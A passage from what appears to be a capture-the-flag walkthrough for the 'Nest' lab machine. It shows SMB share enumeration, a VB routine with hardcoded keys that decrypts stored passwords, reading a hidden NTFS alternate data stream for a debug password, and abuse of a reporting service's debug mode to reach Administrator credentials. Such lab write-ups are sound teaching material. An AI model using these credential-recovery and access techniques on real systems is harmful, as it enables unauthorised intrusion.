<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\C</span>onfigs<span style="color:#ae81ff">\R</span>u Scanner<span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 22:01:13 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 22:01:13 <span style="color:#ae81ff">2019</span>
  RU_config.xml                       A      <span style="color:#ae81ff">270</span>  Thu Aug  <span style="color:#ae81ff">8</span> 21:49:37 <span style="color:#ae81ff">2019</span>

        <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6545577</span> blocks available
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat RU_config.xml 
&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span>?&gt;
&lt;ConfigFile xmlns:xsi<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> xmlns:xsd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XMLSchema&#34;</span>&gt;
  &lt;Port&gt;389&lt;/Port&gt;
  &lt;Username&gt;c.smith&lt;/Username&gt;
  &lt;Password&gt;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE<span style="color:#f92672">=</span>&lt;/Password&gt;
&lt;/ConfigFile&gt;%
</code></pre></div><p>A user! The password here seems encrypted. Nevertheless, no doubt, we&rsquo;re on the right track.
New mission: find the project &ldquo;RU Scanner&rdquo;. Indeed, if it uses configuration files like this one, then it must be able to decipher the password.</p>
<p>I didn&rsquo;t mention it at the beginning of the post, but this machine relies mainly on enumeration and information gathering. As always, not being able to move forward, we continue to investigate the resources that are available. A good idea may be to go and search the other resources in the &ldquo;Configs&rdquo; directory. Indeed, there is for example a configuration for the Notepad++ software.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\C</span>onfigs<span style="color:#ae81ff">\N</span>otepadPlusPlus<span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 21:31:37 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 21:31:37 <span style="color:#ae81ff">2019</span>
  config.xml                          A     <span style="color:#ae81ff">6451</span>  Thu Aug  <span style="color:#ae81ff">8</span> 01:01:25 <span style="color:#ae81ff">2019</span>
  shortcuts.xml                       A     <span style="color:#ae81ff">2108</span>  Wed Aug  <span style="color:#ae81ff">7</span> 21:30:27 <span style="color:#ae81ff">2019</span>

        <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6545509</span> blocks available
</code></pre></div><p>This file reveals an absolute path toward the <code>Carl</code> user personnal files.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">    &lt;History nbMaxFile<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;15&#34;</span> inSubMenu<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;no&#34;</span> customLength<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;-1&#34;</span>&gt;
        &lt;File filename<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;C:\windows\System32\drivers\etc\hosts&#34;</span> /&gt;
        &lt;File filename<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;\\HTB-NEST\Secure</span>$<span style="color:#e6db74">\IT\Carl\Temp.txt&#34;</span> /&gt;
        &lt;File filename<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;C:\Users\C.Smith\Desktop\todo.txt&#34;</span> /&gt;
    &lt;/History&gt;
</code></pre></div><p>Even though we don&rsquo;t have permission to list the contents of the <code>IT</code> directory, it turns out that it is possible to continue in the tree, if we have a valid path. This is exactly what we just found. This way, we can sneak into the user&rsquo;s directory. :)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\C</span>arl<span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 21:42:14 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 21:42:14 <span style="color:#ae81ff">2019</span>
  Docs                                D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 21:44:00 <span style="color:#ae81ff">2019</span>
  Reports                             D        <span style="color:#ae81ff">0</span>  Tue Aug  <span style="color:#ae81ff">6</span> 15:45:40 <span style="color:#ae81ff">2019</span>
  VB Projects                         D        <span style="color:#ae81ff">0</span>  Tue Aug  <span style="color:#ae81ff">6</span> 16:41:55 <span style="color:#ae81ff">2019</span>

        <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6545509</span> blocks available
</code></pre></div><p>The <code>VB Projects</code> directory clearly shows the way. A few directories further on, we come across the famous <code>RUScanner</code> project!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\C</span>arl<span style="color:#ae81ff">\V</span>B Projects<span style="color:#ae81ff">\W</span>IP<span style="color:#ae81ff">\R</span>U<span style="color:#ae81ff">\R</span>UScanner<span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:05:54 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:05:54 <span style="color:#ae81ff">2019</span>
  bin                                 D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 22:00:11 <span style="color:#ae81ff">2019</span>
  ConfigFile.vb                       A      <span style="color:#ae81ff">772</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:05:09 <span style="color:#ae81ff">2019</span>
  Module1.vb                          A      <span style="color:#ae81ff">279</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:05:44 <span style="color:#ae81ff">2019</span>
  My Project                          D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 22:00:11 <span style="color:#ae81ff">2019</span>
  obj                                 D        <span style="color:#ae81ff">0</span>  Wed Aug  <span style="color:#ae81ff">7</span> 22:00:11 <span style="color:#ae81ff">2019</span>
  RU Scanner.vbproj                   A     <span style="color:#ae81ff">4828</span>  Fri Aug  <span style="color:#ae81ff">9</span> 17:37:51 <span style="color:#ae81ff">2019</span>
  RU Scanner.vbproj.user              A      <span style="color:#ae81ff">143</span>  Tue Aug  <span style="color:#ae81ff">6</span> 14:55:27 <span style="color:#ae81ff">2019</span>
  SsoIntegration.vb                   A      <span style="color:#ae81ff">133</span>  Thu Aug  <span style="color:#ae81ff">8</span> 00:05:58 <span style="color:#ae81ff">2019</span>
  Utils.vb                            A     <span style="color:#ae81ff">4888</span>  Wed Aug  <span style="color:#ae81ff">7</span> 21:49:35 <span style="color:#ae81ff">2019</span>

        <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6545509</span> blocks available
</code></pre></div><p>Small trick you can use in order to download an entire folder using smbclient.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\C</span>arl<span style="color:#ae81ff">\V</span>B Projects<span style="color:#ae81ff">\W</span>IP<span style="color:#ae81ff">\R</span>U<span style="color:#ae81ff">\R</span>UScanner<span style="color:#ae81ff">\&gt;</span> mask <span style="color:#e6db74">&#34;&#34;</span>
smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\C</span>arl<span style="color:#ae81ff">\V</span>B Projects<span style="color:#ae81ff">\W</span>IP<span style="color:#ae81ff">\R</span>U<span style="color:#ae81ff">\R</span>UScanner<span style="color:#ae81ff">\&gt;</span> recurse ON
smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\C</span>arl<span style="color:#ae81ff">\V</span>B Projects<span style="color:#ae81ff">\W</span>IP<span style="color:#ae81ff">\R</span>U<span style="color:#ae81ff">\R</span>UScanner<span style="color:#ae81ff">\&gt;</span> prompt OFF
smb: <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\C</span>arl<span style="color:#ae81ff">\V</span>B Projects<span style="color:#ae81ff">\W</span>IP<span style="color:#ae81ff">\R</span>U<span style="color:#ae81ff">\R</span>UScanner<span style="color:#ae81ff">\&gt;</span> mget *
getting file <span style="color:#ae81ff">\I</span>T<span style="color:#ae81ff">\C</span>arl<span style="color:#ae81ff">\V</span>B Projects<span style="color:#ae81ff">\W</span>IP<span style="color:#ae81ff">\R</span>U<span style="color:#ae81ff">\R</span>UScanner<span style="color:#ae81ff">\C</span>onfigFile.vb of size <span style="color:#ae81ff">772</span> as ConfigFile.vb <span style="color:#f92672">(</span>1.8 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 1.8 KiloBytes/sec<span style="color:#f92672">)</span>
...
</code></pre></div><h2 id="decryption-and-user-shell">Decryption and user shell</h2>
<p>Having now the source code of the VB project, the goal is to identify the parts of the code allowing to perform the encryption/decryption of passwords. I won&rsquo;t go into the details of the code, but a <code>Decrypt</code> function can be identified quite easily.</p>
<p>It takes several variables as parameters, including the encrypted password. If you don&rsquo;t have the necessary environment to work with VB, you should know that there are several online services offering a simplified virtual environment.</p>
<p>This is notably the case of dotnetfiddle.com that I used for this machine. So we extract the decryption function, which we will call in a simple module, then we display the result.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Imports System
Imports System.Security.Cryptography
Imports System.Text

Public Module Module1
    Public Sub Main<span style="color:#f92672">()</span>
        Console.WriteLine<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Hello World&#34;</span><span style="color:#f92672">)</span>
        Dim password As String
        password <span style="color:#f92672">=</span> Decrypt<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&#34;</span>, <span style="color:#e6db74">&#34;N3st22&#34;</span>, <span style="color:#e6db74">&#34;88552299&#34;</span>, 2, <span style="color:#e6db74">&#34;464R5DFA5DL6LE28&#34;</span>, 256<span style="color:#f92672">)</span>
        Console.WriteLine<span style="color:#f92672">(</span>password<span style="color:#f92672">)</span>
    End Sub
    
    Public Function Decrypt<span style="color:#f92672">(</span>ByVal cipherText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer<span style="color:#f92672">)</span> _
                           As String

        Dim initVectorBytes As Byte<span style="color:#f92672">()</span>
        initVectorBytes <span style="color:#f92672">=</span> Encoding.ASCII.GetBytes<span style="color:#f92672">(</span>initVector<span style="color:#f92672">)</span>

        Dim saltValueBytes As Byte<span style="color:#f92672">()</span>
        saltValueBytes <span style="color:#f92672">=</span> Encoding.ASCII.GetBytes<span style="color:#f92672">(</span>saltValue<span style="color:#f92672">)</span>

        Dim cipherTextBytes As Byte<span style="color:#f92672">()</span>
        cipherTextBytes <span style="color:#f92672">=</span> Convert.FromBase64String<span style="color:#f92672">(</span>cipherText<span style="color:#f92672">)</span>

        Dim password As New Rfc2898DeriveBytes<span style="color:#f92672">(</span>passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations<span style="color:#f92672">)</span>

        Dim keyBytes As Byte<span style="color:#f92672">()</span>
        keyBytes <span style="color:#f92672">=</span> password.GetBytes<span style="color:#f92672">(</span>CInt<span style="color:#f92672">(</span>keySize / 8<span style="color:#f92672">))</span>

        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode <span style="color:#f92672">=</span> CipherMode.CBC

        Dim decryptor As ICryptoTransform
        decryptor <span style="color:#f92672">=</span> symmetricKey.CreateDecryptor<span style="color:#f92672">(</span>keyBytes, initVectorBytes<span style="color:#f92672">)</span>

        Dim memoryStream As IO.MemoryStream
        memoryStream <span style="color:#f92672">=</span> New IO.MemoryStream<span style="color:#f92672">(</span>cipherTextBytes<span style="color:#f92672">)</span>

        Dim cryptoStream As CryptoStream
        cryptoStream <span style="color:#f92672">=</span> New CryptoStream<span style="color:#f92672">(</span>memoryStream, _
                                        decryptor, _
                                        CryptoStreamMode.Read<span style="color:#f92672">)</span>

        Dim plainTextBytes As Byte<span style="color:#f92672">()</span>
        ReDim plainTextBytes<span style="color:#f92672">(</span>cipherTextBytes.Length<span style="color:#f92672">)</span>

        Dim decryptedByteCount As Integer
        decryptedByteCount <span style="color:#f92672">=</span> cryptoStream.Read<span style="color:#f92672">(</span>plainTextBytes, _
                                               0, _
                                               plainTextBytes.Length<span style="color:#f92672">)</span>

        memoryStream.Close<span style="color:#f92672">()</span>
        cryptoStream.Close<span style="color:#f92672">()</span>

        Dim plainText As String
        plainText <span style="color:#f92672">=</span> Encoding.ASCII.GetString<span style="color:#f92672">(</span>plainTextBytes, _
                                            0, _
                                            decryptedByteCount<span style="color:#f92672">)</span>

        Return plainText
    End Function
End Module
</code></pre></div><p>We quickly get the desired result, password !</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Hello World
xRxRxPANCAK3SxRxRx
</code></pre></div><p>In particular, this allows us to get access to a new zone, as well as the user flag!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;c.smith&#34;</span> <span style="color:#ae81ff">\\\\</span>10.10.10.178<span style="color:#ae81ff">\\</span>Users
Enter WORKGROUP<span style="color:#ae81ff">\c</span>.smith<span style="color:#ae81ff">\&#39;</span>s password: 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> cd C.Smith<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>smb: <span style="color:#ae81ff">\C</span>.Smith<span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 08:21:44 <span style="color:#ae81ff">2020</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 08:21:44 <span style="color:#ae81ff">2020</span>
  HQK Reporting                       D        <span style="color:#ae81ff">0</span>  Fri Aug  <span style="color:#ae81ff">9</span> 01:06:17 <span style="color:#ae81ff">2019</span>
  user.txt                            A       <span style="color:#ae81ff">32</span>  Fri Aug  <span style="color:#ae81ff">9</span> 01:05:24 <span style="color:#ae81ff">2019</span>

        <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6545509</span> blocks available
</code></pre></div><h2 id="getting-the-debug-password">Getting the DEBUG password</h2>
<p>New access = new enumeration phase.
The directory <code>HQK Reporting</code> draws our attention. Remember, similar information was reported during the nmap scan. So it makes sense that this is the reporting service.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\C</span>.smith<span style="color:#ae81ff">\H</span>QK Reporting<span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Fri Aug  <span style="color:#ae81ff">9</span> 01:06:17 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Fri Aug  <span style="color:#ae81ff">9</span> 01:06:17 <span style="color:#ae81ff">2019</span>
  AD Integration Module               D        <span style="color:#ae81ff">0</span>  Fri Aug  <span style="color:#ae81ff">9</span> 14:18:42 <span style="color:#ae81ff">2019</span>
  Debug Mode Password.txt             A        <span style="color:#ae81ff">0</span>  Fri Aug  <span style="color:#ae81ff">9</span> 01:08:17 <span style="color:#ae81ff">2019</span>
  HQK_Config_Backup.xml               A      <span style="color:#ae81ff">249</span>  Fri Aug  <span style="color:#ae81ff">9</span> 01:09:05 <span style="color:#ae81ff">2019</span>

        <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6544215</span> blocks available
</code></pre></div><p>During my first researches on the machine, I tried to connect to the service saw a debugging function, requiring a password. That&rsquo;s fortunate, the above extract mentions a <code>Debug Mode Password.txt</code> file. Only problem, the file seems empty (size 0)&hellip;</p>
<p>This is where a file system trick comes in, streams!
In simple words, a stream is a sequence of bytes containing information about a file. It can be keywords, owner information, etc. It is possible to create different streams.</p>
<p>With <code>smbclient</code> you can see this information with the following command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\C</span>.smith<span style="color:#ae81ff">\H</span>QK Reporting<span style="color:#ae81ff">\&gt;</span> allinfo <span style="color:#e6db74">&#34;Debug Mode Password.txt&#34;</span>
altname: DEBUGM~1.TXT
create_time:    Fri Aug  <span style="color:#ae81ff">9</span> 01:06:12 AM <span style="color:#ae81ff">2019</span> CEST
access_time:    Fri Aug  <span style="color:#ae81ff">9</span> 01:06:12 AM <span style="color:#ae81ff">2019</span> CEST
write_time:     Fri Aug  <span style="color:#ae81ff">9</span> 01:08:17 AM <span style="color:#ae81ff">2019</span> CEST
change_time:    Fri Aug  <span style="color:#ae81ff">9</span> 01:08:17 AM <span style="color:#ae81ff">2019</span> CEST
attributes: A <span style="color:#f92672">(</span>20<span style="color:#f92672">)</span>
stream: <span style="color:#f92672">[</span>::$DATA<span style="color:#f92672">]</span>, <span style="color:#ae81ff">0</span> bytes
stream: <span style="color:#f92672">[</span>:Password:$DATA<span style="color:#f92672">]</span>, <span style="color:#ae81ff">15</span> bytes
</code></pre></div><p>Thus we observe an interesting element&hellip; The default stream ($DATA) is indeed empty, but a second stream, named &ldquo;Password&rdquo; has been created !
<code>smbclient</code> also offers the possibility to download a file by specifying the desired steams.
So&hellip;</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smb: <span style="color:#ae81ff">\C</span>.smith<span style="color:#ae81ff">\H</span>QK Reporting<span style="color:#ae81ff">\&gt;</span> get <span style="color:#e6db74">&#34;Debug Mode Password.txt:Password:</span>$Data<span style="color:#e6db74">&#34;</span>
getting file <span style="color:#ae81ff">\C</span>.smith<span style="color:#ae81ff">\H</span>QK Reporting<span style="color:#ae81ff">\D</span>ebug Mode Password.txt:Password:$Data of size <span style="color:#ae81ff">15</span> as Debug Mode Password.txt:Password:$Data <span style="color:#f92672">(</span>0.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.0 KiloBytes/sec<span style="color:#f92672">)</span>

$ cat Debug<span style="color:#ae81ff">\ </span>Mode<span style="color:#ae81ff">\ </span>Password.txt:Password:<span style="color:#ae81ff">\$</span>Data 
WBQ201953D8w 
</code></pre></div><h2 id="playing-with-the-reporting-service">Playing with the reporting service</h2>
<p>The resolution of this machine continues on the second service identified during port scanning.
This allows you to connect to the service through telnet.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ telnet 10.10.10.178 <span style="color:#ae81ff">4386</span>
Trying 10.10.10.178...
Connected to 10.10.10.178.
Escape character is <span style="color:#e6db74">&#39;^]&#39;</span>.

HQK Reporting Service V1.2

&gt;help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR &lt;Directory_Name&gt;
RUNQUERY &lt;Query_ID&gt;
DEBUG &lt;Password&gt;
HELP &lt;Command&gt;
</code></pre></div><p>Now that we have the DEBUG password, we can start this mode and get access to more commands.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt;DEBUG WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
&gt;HELP

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR &lt;Directory_Name&gt;
RUNQUERY &lt;Query_ID&gt;
DEBUG &lt;Password&gt;
HELP &lt;Command&gt;
SERVICE
SESSION
SHOWQUERY &lt;Query_ID&gt;
</code></pre></div><p>The <code>SERVICE</code> command tells us the binary used here, while the <code>SESSION</code> command tells us the current directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt;SERVICE

--- HQK REPORTING SERVER INFO ---

Version: 1.2.0.0
Server Hostname: HTB-NEST
Server Process: <span style="color:#e6db74">&#34;C:\Program Files\HQK\HqkSvc.exe&#34;</span>
Server Running As: Service_HQK
Initial Query Directory: C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\H</span>QK<span style="color:#ae81ff">\A</span>LL QUERIES

&gt;SESSION

--- Session Information ---

Session ID: 32315e55-e64a-4b71-bf3f-124285e93ede
Debug: True
Started At: 3/29/2020 11:55:33 AM
Server Endpoint: 10.10.10.178:4386
Client Endpoint: 10.10.14.4:34380
Current Query Directory: C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\H</span>QK<span style="color:#ae81ff">\A</span>LL QUERIES
</code></pre></div><p>Afterwards, the <code>SETDIR</code>, <code>LIST</code> and <code>SHOWQUERY</code> commands are used. In fact, we can use them as a system to browse the machine filesystem. Indeed, it is possible to associate these commands with the classic <code>cd</code>, <code>ls</code> and <code>cat</code> commands.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt;SETDIR ../

Current directory set to HQK

&gt;LIST

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

<span style="color:#f92672">[</span>DIR<span style="color:#f92672">]</span>  ALL QUERIES
<span style="color:#f92672">[</span>DIR<span style="color:#f92672">]</span>  LDAP
<span style="color:#f92672">[</span>DIR<span style="color:#f92672">]</span>  Logs
<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>   HqkSvc.exe
<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>   HqkSvc.InstallState
<span style="color:#f92672">[</span>3<span style="color:#f92672">]</span>   HQK_Config.xml

Current Directory: HQK
</code></pre></div><p>The <code>LDAP</code> and <code>Logs</code> directories catch our attention. The <code>LDAP</code> directory is where we find what we are looking for.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt;SETDIR LDAP

Current directory set to LDAP

&gt;LIST

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>   HqkLdap.exe
<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>   Ldap.conf

Current Directory: LDAP
</code></pre></div><p>The <code>Ldap.conf</code> file reveals the desired information such as the encrypted password for the administrator!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt;SHOWQUERY <span style="color:#ae81ff">2</span>

Domain<span style="color:#f92672">=</span>nest.local
Port<span style="color:#f92672">=</span><span style="color:#ae81ff">389</span>
BaseOu<span style="color:#f92672">=</span>OU<span style="color:#f92672">=</span>WBQ Users,OU<span style="color:#f92672">=</span>Production,DC<span style="color:#f92672">=</span>nest,DC<span style="color:#f92672">=</span>local
User<span style="color:#f92672">=</span>Administrator
Password<span style="color:#f92672">=</span>yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4<span style="color:#f92672">=</span>
</code></pre></div><h2 id="decryption-vol2-and-privilege-escalation">Decryption vol.2 and privilege escalation</h2>
<p>Okay, we now have an encrypted password for the privileged account!
This part seems to be directly used by the process to perform the administrator authentication. So that means we&rsquo;re going to have to interact directly with this process.</p>
<p>We start by retrieving it locally.</p>
<p>Once this is done, we can decompile the binary. I used <code>dnSpy</code> for this. I also skip the analysis here, but we quickly find the decryption function. This one is identical to the one previously identified for the user part.</p>
<p>At this point, there are two options to decrypt the password :</p>
<ul>
<li>Modify the binary code, to display the decrypted password, then recompile and execute it;</li>
<li>Use our online environment again by changing the function settings.</li>
</ul>
<p>Not being very good with <code>dnSpy</code> and being a bit fed up of this machine, I took the easy way out by reusing the same thing as for the user :).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
Public Sub Main<span style="color:#f92672">()</span>
        Console.WriteLine<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Hello World&#34;</span><span style="color:#f92672">)</span>
        Dim password As String
        password <span style="color:#f92672">=</span> Decrypt<span style="color:#f92672">(</span>EncryptedString, <span style="color:#e6db74">&#34;667912&#34;</span>, <span style="color:#e6db74">&#34;1313Rf99&#34;</span>, 3, <span style="color:#e6db74">&#34;1L1SA61493DRV53Z&#34;</span>, 256, 256<span style="color:#f92672">)</span>
        Console.WriteLine<span style="color:#f92672">(</span>password<span style="color:#f92672">)</span>
    End Sub
<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</code></pre></div><p>And so: <code>XtH4nkS4Pl4y1nGX</code></p>
<p>Tadaaaam!
We can connect and get the root flag.</p>
<p>For your information, I first went to the <code>Users</code> share and this is what I found.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;Administrator&#34;</span> <span style="color:#ae81ff">\\\\</span>10.10.10.178<span style="color:#ae81ff">\\</span>Users  
Unable to initialize messaging context
Enter WORKGROUP<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\&#39;</span>s password: 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\&gt;</span> cd Administrator<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>smb: <span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\&gt;</span> ls
  .                                   D        <span style="color:#ae81ff">0</span>  Fri Aug  <span style="color:#ae81ff">9</span> 17:08:23 <span style="color:#ae81ff">2019</span>
  ..                                  D        <span style="color:#ae81ff">0</span>  Fri Aug  <span style="color:#ae81ff">9</span> 17:08:23 <span style="color:#ae81ff">2019</span>
  flag.txt - Shortcut.lnk             A     <span style="color:#ae81ff">2384</span>  Fri Aug  <span style="color:#ae81ff">9</span> 17:10:15 <span style="color:#ae81ff">2019</span>

    <span style="color:#ae81ff">10485247</span> blocks of size 4096. <span style="color:#ae81ff">6544908</span> blocks available
</code></pre></div><p>No root flag&hellip; But a &ldquo;flag.txt&rdquo; file (impossible to retrieve for me).
After a few seconds, I thought about the fact that the <code>Users</code> share was a copy/reproduction of the <code>C:/Users</code> directory of the machine, and that having administrator rights, we could simply connect to it.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;Administrator&#34;</span> <span style="color:#ae81ff">\\\\</span>10.10.10.178<span style="color:#ae81ff">\\</span>C$
Enter WORKGROUP<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\&#39;</span>s password: 
Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
smb: <span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\&gt;</span> ls
  .                                  DR        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 08:20:50 <span style="color:#ae81ff">2020</span>
  ..                                 DR        <span style="color:#ae81ff">0</span>  Sun Jan <span style="color:#ae81ff">26</span> 08:20:50 <span style="color:#ae81ff">2020</span>
